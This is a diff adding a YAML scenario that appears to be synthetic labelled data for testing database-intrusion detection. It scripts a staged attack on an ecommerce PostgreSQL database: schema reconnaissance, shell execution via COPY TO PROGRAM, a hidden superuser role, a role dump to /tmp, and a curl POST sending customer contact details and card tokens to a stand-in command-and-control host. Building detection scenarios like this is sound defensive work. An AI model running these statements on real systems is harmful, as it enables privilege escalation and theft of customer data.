@@ -1,0 +1,50 @@
+scenario_id: ecommerce_multi_apt_0016
+family_id: ecommerce_multi_apt_0016
+domain: ecommerce
+time_of_day: 03:30
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: recon
+  role: support_agent
+  class: malicious
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 2.62401382158766
+  events:
+  - sql: SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'
+  - sql: SELECT column_name FROM information_schema.columns WHERE table_name = 'customers'
+  - step_id: recon_probe
+    sql: COPY (SELECT 'probe') TO PROGRAM 'cat > /dev/null'
+- session_label: escalate
+  role: support_agent
+  class: malicious
+  anchor: db
+  delay_after_previous_seconds: 29.404476180875704
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.6107691091158345
+  events:
+  - step_id: create_shadow
+    sql: CREATE ROLE apt_shadow SUPERUSER LOGIN PASSWORD 'hgiVRIcuhr'
+  - step_id: dump_creds
+    sql: COPY (SELECT rolname FROM pg_authid) TO PROGRAM 'cat >> /tmp/.cache/roles.txt'
+- session_label: exfil
+  role: analytics_etl_service
+  class: malicious
+  anchor: db
+  delay_after_previous_seconds: 37.69579455527746
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 2.8717679750538387
+  events:
+  - step_id: exfil
+    sql: COPY (SELECT c.email, c.phone, c.shipping_address, pay.card_token FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id) TO PROGRAM 'curl
+      -sX POST https://c2.example.net/data -d @-'
+    connects_to:
+      ip: 91.219.236.174
+      port: 443
